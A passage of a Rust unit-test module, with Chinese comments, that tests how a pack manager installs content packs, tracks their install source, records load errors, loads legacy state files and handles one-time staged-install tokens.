        // 直接调内部逻辑（命令层需要 AppHandle）
        st = load_state(&dir);
        let idx = st.packs.iter().position(|p| p.id == "play-a").unwrap();
        st.packs.remove(idx);
        let _ = std::fs::remove_dir_all(install_dir(&dir, "play-a"));
        st.active_id = None;
        save_state(&dir, &st).unwrap();
        let back = load_state(&dir);
        assert!(back.active_id.is_none(), "不自动顺延");
        assert_eq!(back.packs.len(), 1);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn validate_on_disk_drops_ghost_packs() {
        let dir = tmp_dir("install8");
        let mut st = SourceBundleState::new_v3();
        st.pack_mut_or_push(SourcePackMeta {
            id: "ghost".into(),
            kind: PACK_KIND_PLAY.into(),
            name: "幽灵".into(),
            version_code: 1,
            version_name: "v1".into(),
            update_url: String::new(),
            dir: "ghost".into(),
            installed_at: 1,
            updated_at: 1,
            skip_codes: vec![],
            last_probe_at: 0,
            install_source: String::new(),
            install_ref: String::new(),
            last_error: String::new(),
            last_error_at: 0,
            sign_verified: false,
        });
        st.active_id = Some("ghost".into());
        save_state(&dir, &st).unwrap();
        let back = load_state(&dir);
        assert!(back.packs.is_empty(), "产物缺失的包剔除");
        assert!(back.active_id.is_none());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn install_source_channels_url_self_manifest() {
        let dir = tmp_dir("src-ch");
        // 包 id 专用（play-ch）而非 play-x：待生效现场是按 id 存的进程级全局表，
        // 与 same_id_update_backs_up_prev_and_keeps_installed_at 的 play-x 同名时，
        // 本测试末尾的 take_pending 会把那边 rollback 要用的现场抽走，让
        // `assert!(reverted && blacklisted)` 随机失败。
        let url = "https://example.com/play-ch.js";
        // 首装（直链）：url + URL
        install_pack_at(
            &dir,
            &pack_text(PACK_KIND_PLAY, "play-ch", 1, true),
            false,
            INSTALL_SOURCE_URL,
            url,
        )
        .unwrap();
        take_pending("play-ch");
        let st = load_state(&dir);
        let p = st.pack("play-ch").unwrap();
        assert_eq!(p.install_source, "url");
        assert_eq!(p.install_ref, url);
        // 自管更新（包自身 updateUrl 通道）：保留原安装来源
        install_pack_at(
            &dir,
            &pack_text(PACK_KIND_PLAY, "play-ch", 2, true),
            true,
            "",
            "",
        )
        .unwrap();
        take_pending("play-ch");
        let st = load_state(&dir);
        let p = st.pack("play-ch").unwrap();
        assert_eq!(p.install_source, "url", "自管更新保留原来源");
        assert_eq!(p.install_ref, url);
        // 官方 manifest 通道更新：改写为 manifest + 空 ref
        install_pack_at(
            &dir,
            &pack_text(PACK_KIND_PLAY, "play-ch", 3, true),
            true,
            INSTALL_SOURCE_MANIFEST,
            "",
        )
        .unwrap();
        take_pending("play-ch");
        let st = load_state(&dir);
        let p = st.pack("play-ch").unwrap();
        assert_eq!(p.install_source, "manifest");
        assert_eq!(p.install_ref, "");
        // 再来一次自管更新：仍保留（上一轮写入的）manifest 来源
        install_pack_at(
            &dir,
            &pack_text(PACK_KIND_PLAY, "play-ch", 4, true),
            true,
            "",
            "",
        )
        .unwrap();
        take_pending("play-ch");
        let st = load_state(&dir);
        assert_eq!(st.pack("play-ch").unwrap().install_source, "manifest");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn fresh_install_without_old_record_self_channel_is_manifest() {
        let dir = tmp_dir("src-bl");
        // 首装 offer 走 apply（is_update 但无旧记录）→ 视作官方数据包本体。
        // 旁路签名闸门：这里测的是来源归属语义，且模拟的是签名落地前的
        // 历史安装路径（闸门本身的验证见 official_pack_gate_* 测试）
        let _gate = SignatureGateBypass::new();
        install_pack_at(
            &dir,
            &pack_text(PACK_KIND_META, OFFICIAL_META_ID, 5, false),
            true,
            "",
            "",
        )
        .unwrap();
        take_pending(OFFICIAL_META_ID);
        let st = load_state(&dir);
        let p = st.pack(OFFICIAL_META_ID).unwrap();
        assert_eq!(p.install_source, "manifest");
        assert_eq!(p.install_ref, "");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn note_and_clear_pack_error_roundtrip() {
        let dir = tmp_dir("err-note");
        install_pack_at(
            &dir,
            &pack_text(PACK_KIND_PLAY, "play-e", 1, true),
            false,
            INSTALL_SOURCE_URL,
            "https://e/x.js",
        )
        .unwrap();
        take_pending("play-e");
        note_pack_error_at(
            &dir,
            "play-e",
            "  装载失败：ReferenceError: x is not defined  ",
        );
        let st = load_state(&dir);
        let p = st.pack("play-e").unwrap();
        assert_eq!(
            p.last_error, "装载失败：ReferenceError: x is not defined",
            "trim 后入库"
        );
        let stamped_at = p.last_error_at;
        assert!(
            stamped_at > 1_700_000_000_000,
            "毫秒时间戳（unix 秒会是 10 位）"
        );
        drop(p);
        // 同一条失败不重复刷时间
        note_pack_error_at(&dir, "play-e", "装载失败：ReferenceError: x is not defined");
        let st = load_state(&dir);
        assert_eq!(st.pack("play-e").unwrap().last_error_at, stamped_at);
        // 包不存在 → 静默跳过（不 panic、不落盘新包）
        note_pack_error_at(&dir, "ghost-id", "boom");
        // 空串 → 不记
        note_pack_error_at(&dir, "play-e", "   ");
        assert!(!load_state(&dir)
            .pack("play-e")
            .unwrap()
            .last_error
            .is_empty());
        // 成功生效 → 清除
        clear_pack_error_at(&dir, "play-e");
        let st = load_state(&dir);
        let p = st.pack("play-e").unwrap();
        assert!(p.last_error.is_empty() && p.last_error_at == 0);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn legacy_v3_state_missing_new_fields_defaults() {
        let dir = tmp_dir("legacy");
        let target = install_dir(&dir, "play-official");
        std::fs::create_dir_all(&target).unwrap();
        std::fs::write(
            target.join(ARTIFACT_PLAY),
            pack_text(PACK_KIND_PLAY, "play-official", 1, true),
        )
        .unwrap();
        let legacy = r#"{
            "schema": 3,
            "packs": [{"id":"play-official","kind":"play","name":"官方播放包","versionCode":1,
                        "versionName":"v1","updateUrl":"","dir":"play-official",
                        "installedAt":10,"updatedAt":10,"skipCodes":[],"lastProbeAt":0}],
            "activeId": "play-official",
            "activeMetaId": null,
            "lastCheckAt": 0
        }"#;
        std::fs::write(state_path(&dir), legacy).unwrap();
        let st = load_state(&dir);
        let p = st.pack("play-official").unwrap();
        assert_eq!(
            p.install_source, "",
            "旧 v3 状态缺新字段 → 默认空（向后兼容）"
        );
        assert_eq!(p.install_ref, "");
        assert_eq!(p.last_error, "");
        assert_eq!(p.last_error_at, 0);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn staged_install_token_roundtrip() {
        let token = put_staged(StagedInstall {
            channel: INSTALL_SOURCE_URL.to_string(),
            reference: "https://example.com/x.js".to_string(),
            text: pack_text(PACK_KIND_PLAY, "play-s", 1, true),
        });
        assert!(!token.is_empty());
        let staged = take_staged(&token).expect("token 取回暂存现场");
        assert_eq!(staged.channel, INSTALL_SOURCE_URL);
        assert!(staged.text.contains("__QT_PACK__"));
        assert!(
            take_staged(&token).is_none(),
            "一次性消费：重复确认自然失败"
        );
        assert!(take_staged("no-such-token").is_none());
    }
}
